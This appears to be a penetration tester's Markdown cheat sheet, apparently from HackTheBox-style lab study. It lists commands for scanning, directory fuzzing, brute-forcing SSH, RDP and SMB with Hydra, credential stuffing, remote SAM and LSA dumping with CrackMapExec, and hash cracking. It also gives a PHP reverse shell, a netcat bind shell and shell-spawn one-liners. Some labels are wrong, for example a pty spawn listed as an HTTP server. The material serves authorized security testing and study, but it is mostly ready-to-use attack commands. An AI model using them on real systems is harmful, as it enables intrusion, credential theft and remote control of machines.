# Useful Codes
---
## nMap
---
- Vulnerability Script Nmap SE
```bash
sudo nmap $IP -sV --script vuln
```
- Decoy IP Nmap
```bash
sudo nmap $IP -sS -Pn -n -D RND:5
```
- Update Script DB
```bash
sudo nmap --script-updatedb
```
- Find Scripts for nMap
```bash
find / -type f -name $INPUT* 2>/dev/null | grep scripts
```
- FTP Scan with Scripts
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136
```
- SMB Scan with Scripts
```bash
sudo nmap $IP -sV -sC -p139,445
```
---
## Gobuster
---
- Gobuster Dir.

```bash
gobuster dir -u http://$IP --wordlist $Wordlist
```

---
## Hydra
---
- Usage ssh
```bash
hydra -L user.list -P password.list ssh://<ip>
```
- Usage RDP
```bash
hydra -L user.list -P password.list rdp://<ip>
```
- Usage SMB
```bash
hydra -L user.list -P password.list smb://<ip>
```
- Credential Stuffing
```bash
hydra -C user_pass.list ssh://<ip>
```

---
## Netcat
---
- Listening for incoming RevShells
```bash
nc -lvnp <port>
```
- Listen for incoming calls
```bash
nc -nc <IP> <port>
```
- Connect to a target
```bash
nc -nv <IP> <port>
```
- Binding a Bash shell to the TCP session
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <port> > /tmp/f
```


---
## Python
---
- Python Http Server
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- secretsdump.py for SAM
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
- Python smbserver.py
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

---
## Revshells
---
- PHP Reverse Shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```

---
## XML Prettyfy
---
```bash
xsltproc all.xml -o all.html (nmap xml to html)
```
---
## SSL Certificate
- Check Certificate Term Json
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq .
```
- Check Certificate Unique Subdomain
```bash
curl -s https://crt.sh/\?q\=$Domain\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```
---
## Metasploit
- Run Metasploit CLI
```bash
msfconsole
```
- Search exploit
```bash
search <exploit>
```
- Show Exploit options
```bash
show options
```
or
```bash
options
```
- Set parameter for exploit
```bash
set <option> <Value>
```
- Run exploit
```bash
run
```
- Show Payloads
```bash
show payloads
```
- Set Payloads
```bash
set payload <no.>
```
- Show Target of exploit
```bash
show targets
```
- Set Targets
```bash
set target <index no.>
```
- [Meterpreter Commands](/Useful_Pages/Meterpreter_Commands.md)

- Show Sessions
```bash
sessions
```
- Interact with a Session
```bash
sessions -i [no.]
```
- Bruteforce SMB Login
```bash
use auxiliary/scanner/smb/smb_login
```
#### [Example of SMB Bruteforce](/Examples/Example_Bruteforcing_Msfconsole.md)

---
## [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- Usage
```bash
crackmapexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
- View Available SMB shares and what privilages an account have
```bash
crackmapexec smb <target-IP> -u "user" -p "password" --shares
```

#### [Example output](/Examples/Example_Crackmapexec_smbShares.md)

- Dump and crack LSA Secrets Remotely
```bash
crackmapexec smb <ip> --local-auth -u <user> -p <password> --lsa
```
- Dump and crack SAM Remotely
```bash
crackmapexec smb <ip> --local-auth -u <user> -p <password> --sam
```
---
## [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- Usage
```bash
evil-winrm -i <target-IP> -u <username> -p <password>
```
## Hashcat
- Crack Hash
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
- Mutate a password using a custom rule.
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```
- Where to find existing rules
```bash
ls /usr/share/hashcat/rules/
```
---
## [CeWL](https://github.com/digininja/CeWL)
Scans potential words from the company's website and save them in a separate list.
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

---
## FTP
- Download All Available Files
```bash
wget -m --no-passive ftp://anonymous:anonymous@$IP

```
- Recursive Listing
```bash
ls -R
```
---
## SMB (Samba)

- Connect with smbclient
```bash
smbclient -U user \\\\<ip>\\SHARENAME
```

- Get Smb config
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

- List Server's Shares with Null Session (-N) that is an anonymous access.
```bash
smbclient -N -L //$IP
```
## Network File System (NFS)
- Enumerate
```bash
sudo nmap 10.129.9.119 -p111,2049 -sV -sC
```
---

## Ffuf

- Directory Fuzzing
```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<ip>:<port>/FUZZ
```
- Thread Increase
```bash
ffuf -w <wordlist>:FUZZ -u http://<ip>:<port>/FUZZ -t <threads>
```
-Subdomain Fuzzing
```bash
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.<target>/
```

- Fuzzing Vhosts
```bash
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
```

---

## Hash

- [Understanding Hashes](/Useful_Pages/Hash.md)


---

# Perl

- Perl To Shell
```bash
perl —e 'exec "/bin/sh";'
```
```bash
perl: exec "/bin/sh";
```

---

# Ruby

- Ruby To Shell
```bash
ruby: exec "/bin/sh"
```

---

# Xfreerdp

- Connect to host
```bash
xfreerdp /v:<ip> /u:<username> /p:<password>
```


## Various
- Lista Folder
```bash
tree $PATH
```


- Check shell type
```bash
env
```
or
```bash
ps
```

